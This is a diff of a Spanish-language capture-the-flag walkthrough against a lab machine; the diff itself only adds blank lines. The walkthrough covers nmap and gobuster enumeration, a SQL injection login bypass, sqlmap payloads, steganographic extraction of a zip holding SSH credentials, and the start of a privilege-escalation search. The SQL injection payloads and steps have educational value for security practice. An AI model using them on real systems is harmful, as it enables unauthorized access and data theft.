@@ -18,6 +18,7 @@ PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 1 packets transmitted, 1 received, 0% packet loss, time 0ms
 rtt min/avg/max/mdev = 1.426/1.426/1.426/0.000 ms
 ```
+
 - El ttl indica que estamos ante un linux
 
 Ahora procedemos a hacer un escaneo con nmap para ver que puertos están abiertos.
@@ -29,6 +30,7 @@ PORT   STATE SERVICE
 80/tcp open  http
 MAC Address: DA:B4:F0:8E:E7:3E (Unknown)
 ```
+
 - Vemos el puerto 80 HTTP y 22 SSH abiertos.
 
 Ahora procedemos a hacer un segundo escaneo mas profundo sobre los puertos abiertos para detectar versiones y servicios que estan corriendo.
@@ -46,6 +48,7 @@ PORT   STATE SERVICE VERSION
 MAC Address: DA:B4:F0:8E:E7:3E (Unknown)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+
 - Puerto 22 SSH: OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
 - Puerto 80 HTTP: Apache httpd 2.4.61 ((Debian))
 
@@ -81,6 +84,7 @@ Starting gobuster in directory enumeration mode
 /server-status        (Status: 403) [Size: 275]
 /index.php            (Status: 200) [Size: 2351]
 ```
+
 - _index.php_ hace referencia al login
 - _auth.php_ es el script que controla el login
 
@@ -95,6 +99,7 @@ El Formulario de Login, puede ser bypasseado con un simple SQLi
 ```sql
 1' or 1=1-- -
 ```
+
 - Al bypassear el login, nos lleva a _page.php_
 
 Sabiendo que el formulario era vulnerable a SQLi lo primero que hice fue comprobarlo con sqlmap:
@@ -114,6 +119,7 @@ Parameter: username (POST)
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: username=NVJA' AND (SELECT 5085 FROM (SELECT(SLEEP(5)))loap)-- USWr&password=ouXU
 ```
+
 - vulnerable a una sqli error-based
 
 Ahora procedí a listar las bases de datos:
@@ -123,6 +129,7 @@ Ahora procedí a listar las bases de datos:
 [*] information_schema
 [*] users
 ```
+
 - Lo que nos interesa es la base de datos _users_
 
 Procedo a listar sus tablas:
@@ -178,6 +185,7 @@ StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
 [i] Original filename: "ocultito.zip".
 [i] Extracting to "miramebien.jpg.out".
 ```
+
 - Me extrajo un miramebien.jpg.out que renombre al archivo original _ocultito.zip_
 
 Liste el contenido del zip:
@@ -198,6 +206,7 @@ Ahora que ya tengo la contraseña puedo extraer el zip y ver el contenido del _s
 > cat secret.txt
 carlos:carlitos
 ```
+
 - Posibles credenciales SSH
 
 Intento conectarme mediante SSH con esas credenciales y tengo éxito:
@@ -216,6 +225,7 @@ Lo primero que hago dentro del sistema es ver que binarios puedo ejecutar como r
 ```bash
 > sudo -l
 ```
+
 - Pero no tengo éxito ya que no tengo permisos
 
 Mi segundo approach fue buscar binarios con permisos SUID
